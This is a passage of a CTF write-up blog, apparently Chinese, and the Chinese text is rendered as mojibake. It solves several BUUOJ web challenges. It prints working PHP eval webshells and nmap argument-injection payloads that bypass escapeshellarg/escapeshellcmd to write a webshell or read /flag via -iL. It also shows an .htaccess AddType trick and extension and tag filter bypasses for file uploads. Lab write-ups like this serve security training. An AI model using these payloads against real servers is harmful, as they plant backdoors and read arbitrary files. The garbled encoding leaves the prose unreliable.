<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmapçš„æ ¼å¼åŒ–è¾“å‡º</span><br><span class="line"> ä¿å­˜ä¸ºTXT      nmap -oN + txtä¿å­˜è·¯å¾„ + ç›®æ ‡</span><br><span class="line"> ä¿å­˜ä¸ºXML      nmap -oX + è·¯å¾„ + ç›®æ ‡</span><br><span class="line"> ä¿å­˜ä¸ºGrep     nmap -oG + è·¯å¾„ + ç›®æ ‡</span><br><span class="line"> ä¿å­˜ä¸ºæ‰€æœ‰æ ¼å¼  nmap -oA  //æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«å­˜æ”¾åœ¨&lt;åå­—&gt;.nmapï¼Œ&lt;åå­—&gt;.xmlå’Œ&lt;åå­—&gt;.gnmapä¸­</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹ä¸Šè¿°å‘½ä»¤è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°<code>nmap -oN</code>èƒ½å¤Ÿå°†ç»“æœè¿åŒæ•´æ¡nmapå‘½ä»¤ä¸€èµ·å†™å…¥æµ‹è¯•æ–‡ä»¶ä¸­</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/nmaptest.png" class="" title="nmapæµ‹è¯•">

<p>åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬åœ¨nmapè¯­å¥ä¸­æ’å…¥<strong>ä¸€å¥è¯æœ¨é©¬</strong>ï¼Œå°è¯•å®ç°æœ¨é©¬æ–‡ä»¶çš„ä¸Šä¼ </p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/shell.png" class="" title="nmapä¼ é©¬">

<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸€å¥è¯æœ¨é©¬çš„æ’å…¥å¿…é¡»è¦ç”¨<code>&#39;&#39;</code>å¼•èµ·æ¥ï¼Œå¦åˆ™ä¼šå¯¼è‡´nmapè¯­å¥æ— æ³•æ‰§è¡Œï¼Œå†™å…¥å¤±è´¥ã€‚</p>
<p>ç¡®å®šäº†ä¸Šä¼ webshellçš„æ–¹å‘ï¼Œä¸‹é¢è€ƒè™‘<code>escapeshellarg</code>å’Œ<code>escapeshellcmd</code>å¤„ç†çš„ç»•è¿‡ã€‚åœ¨ä¸Šé¢æˆ‘ä»¬äº†è§£åˆ°</p>
<blockquote>
<p><code>escapeshellarg</code> â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°<br><br><br>åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)<br><br><br>å®šä¹‰ ï¼š<code>string escapeshellarg ( string $arg )</code></p>
</blockquote>
<p>ç®€å•æ¥è¯´ï¼Œ<code>escapeshellarg</code>æ˜¯ä¸ºäº†é˜²æ­¢ç”¨æˆ·åˆ©ç”¨shellçš„ä¸€äº›æŠ€å·§ï¼ˆå¦‚åˆ†å·ã€åå¼•å·ç­‰ï¼‰ï¼Œæ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚</p>
<blockquote>
<p><code>escapeshellcmd</code> â€” shell å…ƒå­—ç¬¦è½¬ä¹‰<br><br><br>åŠŸèƒ½ï¼šescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚<br><br><br>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;åå¼•å·|?~&lt;&gt;^()[]{}$<em>, \x0A å’Œ \xFF</em>ã€‚ *â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚<br><br><br>å®šä¹‰ ï¼š<code>string escapeshellcmd ( string $command)</code></p>
</blockquote>
<p>è€Œ<code>escapeshellcmd</code>åˆ™æ˜¯ä¸ºäº†é˜²æ­¢ç”¨æˆ·çš„è¾“å…¥é€ƒé€¸å‡ºâ€œå‚æ•°å€¼â€çš„ä½ç½®ï¼Œå˜æˆä¸€ä¸ªâ€œå‚æ•°é€‰é¡¹â€ã€‚</p>
<p>æˆ‘ä»¬åœ¨Linuxç¯å¢ƒä¸‹ï¼Œå¯¹<code>127.0.0.1&#39; a b</code>è¿›è¡Œæµ‹è¯•</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/p.png" class="" title="ç¤ºä¾‹">

<p>å¯ä»¥å¾—åˆ°å…¶å¤„ç†çš„è¿‡ç¨‹ï¼š</p>
<ul>
<li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†ï¼Œå…ˆå¯¹ä¸­é—´æ²¡æœ‰é…å¯¹çš„å•å¼•å·è½¬ä¹‰ï¼Œå˜æˆ<code>\&#39;</code>ï¼Œå†ç”¨ä¸¤å¯¹å•å¼•å·ï¼Œåˆ†åˆ«å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ï¼Œä»è€Œèµ·åˆ°è¿æ¥ä½œç”¨ï¼Œå˜æˆ<code>&#39;127.0.0.1&#39;\&#39;&#39; a b&#39;</code></li>
<li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†ï¼Œå…¶å¤„ç†æ—¶ä¼šå¯¹<code>\</code>è¿›è¡Œè½¬ä¹‰ï¼Œå˜æˆ<code>\\</code>ï¼Œè€Œæœ€å<code>b&#39;</code>çš„å•å¼•å·è¢«è§†ä¸º<strong>æ²¡æœ‰é…å¯¹</strong>ï¼Œå› è€Œä¹Ÿè¢«è½¬ä¹‰ï¼Œæœ€åå˜æˆ<code>&#39;127.0.0.1&#39;\\&#39;&#39; a b\&#39;</code></li>
<li>æœ€åè‹¥å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸ºå­—ç¬¦<code>\</code>è€Œä¸å†å…·æœ‰è½¬ä¹‰ä½œç”¨ï¼Œæ‰€ä»¥åé¢çš„<code>&#39;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œè€Œæ˜¯ä¸<code> a</code>å‰é¢çš„<code>&#39;</code>é…å¯¹æˆäº†ä¸€ä¸ª<strong>ç©ºç™½è¿æ¥ç¬¦</strong>ã€‚æœ€ç»ˆåœ¨å‘½ä»¤ä¸­å¯ä»¥ç®€åŒ–ä¸º<code>127.0.0.1\ a b&#39;</code></li>
</ul>
<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h2><p> é‚£ä¹ˆæ ¹æ®æˆ‘ä»¬æœ€ç»ˆå¸Œæœ›æ„é€ å‡ºçš„å‘½ä»¤ï¼Œæ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27; -oG webshell.php</span><br><span class="line"></span><br><span class="line">?host=&#x27;&lt;?php @eval($_POST[a]);?&gt; -oG webshell.php&#x27;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æˆåŠŸä¼šæ˜¾ç¤ºsandboxå€¼ï¼Œä¹Ÿå°±æ˜¯webshell.phpæ‰€åœ¨çš„æ–‡ä»¶å¤¹åï¼Œç›´æ¥ç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°è¿æ¥å¤±è´¥ï¼Œæˆ‘ä»¬å†æ¥åˆ†ææˆ‘ä»¬ä¸Šä¼ çš„<code>$host</code>:</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/wrong.png" class="" title="åˆ†æ">

<p>å¯ä»¥çœ‹åˆ°æœ€åçš„å‘½ä»¤ä¸­ï¼Œwebshell.phpåé¢è¿˜å¸¦æœ‰ä¸¤ä¸ªåæ–œæ <code>\\</code>ï¼Œå…¶ä½™çš„å¼•å·éƒ½è¢«é…å¯¹æˆäº†ç©ºç™½è¿æ¥ç¬¦ï¼Œæ‰€ä»¥æœ€åå†™å…¥çš„æ–‡ä»¶å°±å˜æˆäº†<code>webshell.php\\</code>ã€‚è¿™é‡Œåªéœ€è¦åœ¨æœ€åçš„å¼•å·å‰æ·»åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä½¿<code>php</code>ä¸<code>\\</code>åˆ†å¼€å³å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&lt;?php @eval($_POST[a]);?&gt; -oG webshell.php &#x27;</span><br></pre></td></tr></table></figure>

<p>æœ€åèšå‰‘æˆåŠŸè¿æ¥ï¼Œæ‰¾åˆ°flagã€‚å…¶ä¸­æ‰¾åˆ°çš„<code>webshell.php\\</code>ä¹Ÿè¯å®äº†æˆ‘ä»¬ä¸Šä¸€æ­¥çš„åˆ†æã€‚</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/ant.png" class="" title="èšå‰‘">

<blockquote>
<p>æœ€åçš„æœ€åè¿˜æ˜¯ç•™ä¸‹ä¸€ä¸ªå°é—®é¢˜ï¼Œæ±‚åŠ©æ±‚åŠ©ï¼š<br><br>Q ä¸ºä»€ä¹ˆæˆ‘kaliæ‰§è¡Œnmapå‘½ä»¤æ—¶ï¼Œå¦‚æœä¸ç”¨<code>&#39;&#39;</code>å°†ä¸€å¥è¯æœ¨é©¬æ‹¬èµ·æ¥å°±æ— æ³•æ‰§è¡Œï¼Œè€Œè¿™é‡Œæœ€ç»ˆæ‰§è¡Œæ—¶çš„ä¸€å¥è¯æœ¨é©¬æ˜¯å¯ä»¥ä¸è¢«<code>&#39;&#39;</code>æ‹¬èµ·æ¥çš„ã€‚<br><br>æŒ‡è·¯1ï¼šä¸€ä¸ªå¾ˆæ¼‚äº®çš„Nmapæ€ç»´å¯¼å›¾<a target="_blank" rel="noopener" href="https://blog.csdn.net/ZripenYe/article/details/123344685?ops_request_misc=&request_id=&biz_id=102&utm_term=nmap%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-123344685.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_control1&spm=1018.2226.3001.4187">Nmap åŸºæœ¬ä½¿ç”¨æŒ‡å—æ€ç»´å¯¼å›¾ï¼ˆåŸåˆ›ï¼‰</a><br><br>æŒ‡è·¯2ï¼š<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p>
</blockquote>
<p>2023-01-06 WP</p>
<h1 id="T3-ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#T3-ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="T3 [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>T3 [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap">é¢˜ç›®åœ°å€</a></p>
<p>å†æ¥ä¸€é“Nmapçš„é¢˜æ„Ÿå—ä¸€ä¸‹~è¿›å»å°±æ˜¯ä¸€ä¸ªç½‘é¡µç‰ˆNMAPæ‰«æå™¨ã€‚å…ˆæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°é‡‡ç”¨POSTæ–¹æ³•ä¼ å…¥æ•°æ®<code>host</code>ï¼ŒçŒœæƒ³æ˜¯è¢«ç”¨æ¥æ‹¼æ¥æˆå®Œæ•´Nmapè¯­å¥ï¼Œç»§è€Œè¿›è¡ŒæŸ¥è¯¢ã€‚å¹¶ä¸”å¾—åˆ°æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag is in /flag --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>ç®€å•è¾“å…¥ä¸€ä¸ªIPæµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æœ‰å›æ˜¾ç»“æœï¼š</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test3.png" class="" title="æµ‹è¯•å›æ˜¾ç»“æœ">

<p>å…ˆè€ƒè™‘RCE</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼ŒLinuxä¸‹çš„ç®¡é“ç¬¦<code>|</code>èƒ½å¤Ÿ<strong>å°†ä¸¤ä¸ªæˆ–è€…å¤šä¸ªå‘½ä»¤è¿æ¥åˆ°ä¸€èµ·ï¼ŒæŠŠä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</strong>ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¦‚æœç›´æ¥åœ¨nmapè¯­å¥åæ‹¼æ¥<code>|</code>ï¼Œå°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test3-1.png" class="" title="æœ¬åœ°æµ‹è¯•">

<p>ç„¶è€Œï¼Œåœ¨è¿™é‡Œæ²¡èƒ½å®ç°ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°<code>|</code>å‰åŠ äº†<code>\</code>ã€‚</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test3-2.png" class="" title="æœ¬åœ°æµ‹è¯•">

<p>è”ç³»T2çš„<code>escapeshellarg</code>å’Œ<code>escapeshellcmd</code>å¤„ç†ï¼Œä¼°è®¡è¿™é‡Œä¹Ÿç”¨åˆ°äº†è¿™ä¿©ï¼Œå†ç”¨å¼•å·<code>&#39;</code>è¯•ä¸€ä¸‹ï¼ŒåŒæ ·å˜æˆäº†<code>\&#39;</code>ã€‚å› æ­¤ç›´æ¥ä¾é <code>|</code>å®ç°å‘½ä»¤æ‹¼æ¥å°±æ— æ³•å®ç°äº†ã€‚</p>
<h3 id="ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬"></a>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</h3><p>å€Ÿç”¨T2çš„æ€è·¯ï¼Œåˆ©ç”¨nmapçš„æ ¼å¼åŒ–è¾“å‡ºï¼Œå°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[a]);?&gt; -oG webshell.php &#x27;</span><br></pre></td></tr></table></figure>

<p>ç»“æœè¢«å‘ç°æ˜¯â€Hackerâ€ï¼Œä¼°è®¡æ˜¯å¯¹æŸäº›å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼ˆå¯ä»¥é€šè¿‡æµ‹è¯•å‘ç°<code>php</code>è¢«è¿‡æ»¤ï¼‰ï¼Œåˆ©ç”¨<code>&lt;?=</code>æ¥ä»£æ›¿<code>&lt;?php</code>è¿›è¡Œç»•è¿‡ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶ååç¼€ä¸º<code>phtml</code></p>
<blockquote>
<p><code>&lt;? ?&gt;</code>æ˜¯çŸ­æ ‡ç­¾ï¼Œ<code>&lt;?php ?&gt;</code>æ˜¯é•¿æ ‡ç­¾ã€‚åœ¨phpçš„é…ç½®æ–‡ä»¶ï¼ˆphp.iniï¼‰ä¸­æœ‰ä¸€ä¸ª<code>short_open_tag</code>çš„å€¼ï¼ˆå¼€å¯onï¼‰ï¼Œå¼€å¯ä»¥åå¯ä»¥ä½¿ç”¨PHPçš„çŸ­æ ‡ç­¾ï¼š<code>&lt;? ?&gt;</code> åŒæ—¶ï¼Œåªæœ‰å¼€å¯è¿™ä¸ªæ‰å¯ä»¥ä½¿ç”¨ <code>&lt;?=</code> ä»¥ä»£æ›¿ <code>&lt;?php</code> ã€‚</p>
</blockquote>
<blockquote>
<p>PHTMLï¼ˆæœ‰æ—¶å«åšPHPï¼‰ç½‘é¡µæ˜¯ä¸€ç§åŒ…å«PHPï¼ˆä¸€ç§å’ŒJavaScriptæˆ– Microsoft VBScriptç±»ä¼¼çš„è¯­è¨€ï¼‰è„šæœ¬çš„ç½‘é¡µå’ŒASPä¸€æ ·ï¼ŒPHPè„šæœ¬é•¶åµŒåœ¨ç½‘é¡µçš„HTMLä»£ç ä¹‹ä¸­ã€‚åœ¨é¡µé¢è¢«å‘é€ç»™è¯·æ±‚çš„ç”¨æˆ·ä¹‹å‰ï¼Œç½‘é¡µæœåŠ¡å™¨è°ƒç”¨PHPè§£é‡Šç¨‹åºæ¥è§£é‡Šå’Œæ‰§è¡ŒPHPè„šæœ¬ã€‚å«æœ‰PHPè„šæœ¬çš„ç½‘é¡µé€šå¸¸éƒ½ä»¥â€œ.phpâ€ã€â€œ.php3â€æˆ–â€œ.phtmlâ€ä½œä¸ºåç¼€ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?= @eval($_POST[a]);?&gt; -oG webshell.phtml &#x27;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥èšå‰‘è¿æ¥è·å–Flag.</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/shell3.png" class="" title="ä¸Šä¼ æˆåŠŸ">

<h3 id="åˆ©ç”¨-iLå‚æ•°å®ç°Nmapè¯»å–ä»»æ„æ–‡ä»¶"><a href="#åˆ©ç”¨-iLå‚æ•°å®ç°Nmapè¯»å–ä»»æ„æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨-iLå‚æ•°å®ç°Nmapè¯»å–ä»»æ„æ–‡ä»¶"></a>åˆ©ç”¨<code>-iL</code>å‚æ•°å®ç°Nmapè¯»å–ä»»æ„æ–‡ä»¶</h3><p>nmapæœ‰ä¸¤ä¸ªå‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-iL     ä»inputfilenameæ–‡ä»¶ä¸­è¯»å–æ‰«æçš„ç›®æ ‡</span><br><span class="line">-oN     æŠŠæ‰«æç»“æœé‡å®šå‘åˆ°ä¸€ä¸ªå¯è¯»çš„æ–‡ä»¶logfilenameä¸­</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å·²çŸ¥flagåœ¨æ ¹ç›®å½•ä¸‹çš„<code>/flag</code>ï¼Œé‚£ä¹ˆåˆ©ç”¨<code>nmap -iL /flag -oN flag.txt</code>å°±å¯ä»¥å®ç°å°†è¯»å–çš„flagç»“æœå†™åˆ°å½“å‰ç›®å½•ä¸‹çš„flag.txté‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå‰åéƒ½éœ€è¦æ·»åŠ <strong>ç©ºæ ¼</strong>ï¼Œå…¶è¢«å¤„ç†çš„è¿‡ç¨‹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;                  # åŸpayload</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27; -iL /flag -oN flag.txt &#x27;\&#x27;&#x27;&#x27;          # escapeshellargå¤„ç†ï¼šå…ˆå¯¹ä¸¤ä¸ªå•å¼•å·è½¬ä¹‰ï¼Œå†æ·»åŠ ä¸‰å¯¹å•å¼•å·è¿æ¥</span><br><span class="line">&#x27;&#x27;\\&#x27;&#x27; -iL /flag -oN flag.txt &#x27;\\&#x27;&#x27;&#x27;        # escapeshellcmdå¤„ç†</span><br><span class="line">æœ€åå˜æˆ:</span><br><span class="line">\\ -iL /flag -oN flag.txt \</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°flag.</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/flag3.png" class="" title="Flag">

<h2 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨ -oG ä¼ é©¬</span><br><span class="line">&#x27;&lt;?= @eval($_POST[a]);?&gt; -oG webshell.phtml &#x27;</span><br><span class="line">åˆ©ç”¨ -iL è¯»æ–‡ä»¶</span><br><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure>


<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dongguol/p/5910617.html">phpä¸­çš„çŸ­æ ‡ç­¾</a></p>
</blockquote>
<p>2023-01-08 WP</p>
<h1 id="T4-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#T4-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="T4 [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>T4 [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2">é¢˜ç›®åœ°å€</a></p>
<p>è¿™æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„é¢˜ç›®ã€‚å…ˆç›´æ¥ä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬<code>webshell.php</code>è¯•è¯•ï¼Œæœç„¶ä¸è¡Œï¼Œåº”è¯¥æ˜¯å¯¹phpæ–‡ä»¶è¿›è¡Œäº†è¿‡æ»¤ã€‚ä¿®æ”¹åç¼€ä¸º<code>.jpg</code>ä¸Šä¼ æˆåŠŸã€‚</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/upload.png" class="" title="ä¸Šä¼ æˆåŠŸ">

<p>å¹¶ä¸”ç»™å‡ºäº†æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/9b2fe7222128f385ff624d25edcc2ab3/webshell.jpg</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æƒ³åŠæ³•<strong>å°†jpgæ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶</strong>ï¼Œè¿™é‡Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ialoe/p/520web1.html#d">Dest0g3 520è¿æ–°èµ› funny_upload</a>çš„æ€è·¯ï¼Œåˆ©ç”¨<code>.htaccessæ–‡ä»¶(æˆ–è€…&quot;åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶&quot;ï¼‰</code>å®ç°ã€‚</p>
<blockquote>
<p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p>
</blockquote>
<p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼ˆæ³¨æ„ä¿®æ”¹Content-Typeä¸º<code>image/jpeg</code>ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Addtype application/x-httpd-php .jpg</span><br><span class="line">#å°†ä»¥ jpg ä¸ºåç¼€çš„æ–‡ä»¶å½“åš php è§£æ</span><br></pre></td></tr></table></figure>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/he.png" class="" title="ä¸Šä¼ htaccessæ–‡ä»¶">

<p>æ˜¾ç¤ºâ€&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;9b2fe7222128f385ff624d25edcc2ab3&#x2F;.htaccess succesfully uploaded!â€ï¼Œä¸Šä¼ æˆåŠŸã€‚æ¥ä¸‹æ¥ç”¨èšå‰‘è¿æ¥ï¼Œè·å–flagã€‚</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/ant4.png" class="" title="èšå‰‘">

<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/snowlyzz/article/details/126267637">.htaccessçš„åˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§</a></p>
</blockquote>
<h1 id="T5-æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#T5-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="T5 [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>T5 [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload">é¢˜ç›®åœ°å€</a></p>
<p>è¦æ±‚ä¸Šä¼ å›¾ç‰‡ï¼Œä¼ å…¥ä¸Šä¸€é¢˜çš„å›¾ç‰‡é©¬ï¼Œç„¶ååœ¨bpä¸­é‡æ–°ä¿®æ”¹åç¼€ä¸ºphpï¼Œè¢«å‘ŠçŸ¥â€NOTï¼php!â€ï¼Œäºæ˜¯æ”¹åç¼€ä¸ºâ€phtmlâ€</p>
<blockquote>
<p>ç»•è¿‡åç¼€çš„æœ‰æ–‡ä»¶æ ¼å¼æœ‰<code>php, php3, php4, php5, phtml, pht</code></p>
</blockquote>
<p>åˆå‘ç°<code>&lt;?</code>è¢«è¿‡æ»¤ï¼Œåˆ©ç”¨<code>&lt;script&gt;</code>å°è¯•ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä»ç„¶å¤±è´¥ï¼Œå¹¶ä¸”è¢«å‘ŠçŸ¥ â€œDonâ€™t lie to me, itâ€™s not image at all!!!â€ï¼Œåˆ©ç”¨<code>GIF89a</code>å›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—è¿›è¡Œç»•è¿‡ï¼š</p>
